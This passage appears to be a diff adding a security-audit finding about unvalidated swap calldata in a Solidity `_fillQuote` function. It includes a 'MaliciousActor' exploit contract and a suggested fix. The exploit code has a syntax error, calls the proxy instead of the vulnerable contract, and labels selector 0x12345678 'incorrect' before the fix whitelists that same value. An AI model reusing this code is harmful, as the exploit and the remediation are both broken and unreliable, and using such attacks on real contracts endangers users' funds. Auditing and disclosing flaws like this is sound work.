@@ -128,3 +128,130 @@ function _validateData(address _token, uint256 _amount, Exchange _exchange, byte
 ```
 
 With these improvements, the verifications made in the `_validateData` function become more comprehensive and malicious users are prevented from taking advantage of these deficiencies to gain unfair advantage in the system.
+
+### 👾 Critical Deficiency in `_fillQuote` Function
+
+**Missing Validations:**
+- There is not sufficient validation on the data sent in `_swapCallData`. This may lead malicious users to abuse the system by manipulating calls made through `exchangeProxy`.
+
+### Scenario to Exploit Missing Validations
+
+**Lack:**
+
+```solidity
+function _fillQuote(IERC20 _sellToken, uint256 _amount, bytes calldata _swapCallData) internal {
+ // Track our balance of the buyToken to determine how much we've bought.
+ uint256 boughtWETHAmount = WETH.balanceOf(address(this));
+
+ if (!_sellToken.approve(exchangeProxy, _amount)) {
+ revert SellTokenApprovalFailed();
+ }
+
+ (bool success,) = payable(exchangeProxy).call{value: 0}(_swapCallData); // Critical flaw: _swapCallData is not validated
+
+ if (!success) {
+ revert SwapCallFailed();
+ }
+
+ // Use our current buyToken balance to determine how much we've bought.
+ boughtWETHAmount = WETH.balanceOf(address(this)) - boughtWETHAmount;
+ emit SwappedTokens(address(_sellToken), _amount, boughtWETHAmount);
+}
+```
+
+**Vulnerability:**
+- Since the content of `_swapCallData` is not validated, a malicious user can manipulate this data to abuse calls made through `exchangeProxy`.
+
+### Example of Malicious Code for Abuse
+
+A malicious user can use the operation of the function to his advantage by manipulating the contents of `_swapCallData`.
+
+**Abuse Scenario:**
+
+```solidity
+pragma solidity 0.8.20;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+interface IWETH {
+ function deposit() external payable;
+ function withdraw(uint256) external;
+ function balanceOf(address) external view returns (uint256);
+}
+
+contract MaliciousActor {
+ IERC20 public vulnerableToken;
+ IWETH public WETH;
+ address public exchangeProxy;
+
+ constructor(address _vulnerableToken, address _weth, address _exchangeProxy) {
+ vulnerableToken = IERC20(_vulnerableToken);
+ WETH = IWETH(_weth);
+ exchangeProxy = _exchangeProxy;
+ }
+
+ function exploit() external {
+ uint256 amount = 1000 * 10**18;
+
+ // Preparing malicious calldata
+ bytes memory maliciousData = abi.encodeWithSelector(
+ 0x12345678, // Incorrect selector
+ address(vulnerableToken),
+ address(WETH),
+ amount
+ address(this)
+ );
+
+ // Calling _fillQuote function using malicious calldata
+ vulnerableToken.approve(exchangeProxy, amount);
+ (bool success,) = exchangeProxy.call(maliciousData);
+
+ require(success, "Exploit failed");
+
+ // Check WETH balance as a result of fraudulent transactions
+ uint256 gainedWETH = WETH.balanceOf(address(this));
+ require(gainedWETH > 0, "No WETH gained");
+ }
+}
+```
+
+### Removal of Vulnerability
+
+To eliminate this deficiency, stricter verifications must be made on the content of `_swapCallData` and ensure that transactions are secure. Below is a secured version of the `_fillQuote` function:
+
+```solidity
+function _fillQuote(IERC20 _sellToken, uint256 _amount, bytes calldata _swapCallData) internal {
+ // Track our balance of the buyToken to determine how much we've bought.
+ uint256 boughtWETHAmount = WETH.balanceOf(address(this));
+
+ require(_sellToken.approve(exchangeProxy, _amount), "Sell token approval failed");
+
+ // Additional validations must be performed on _swapCallData
+ require(_validateSwapData(_swapCallData), "Invalid swap call data");
+
+ (bool success,) = payable(exchangeProxy).call{value: 0}(_swapCallData);
+ require(success, "Swap call failed");
+
+ // Use our current buyToken balance to determine how much we've bought.
+ boughtWETHAmount = WETH.balanceOf(address(this)) - boughtWETHAmount;
+ emit SwappedTokens(address(_sellToken), _amount, boughtWETHAmount);
+}
+
+//an additional function to validate _swapCallData
+function _validateSwapData(bytes calldata _data) internal pure returns (bool) {
+ // Validations required to check the validity of the swap call
+ // For example, checking a specific selector and logical parameters
+ bytes4 selector;
+ assembly {
+ selector := calldataload(_data.offset)
+ }
+
+ if (selector != 0x12345678) { // For example, the expected selector
+ return false;
+ }
+
+ // Other logical checks
+ return true;
+}
+```
+These improvements ensure that the `_fillQuote` function is secure and prevent malicious users from abusing the system.
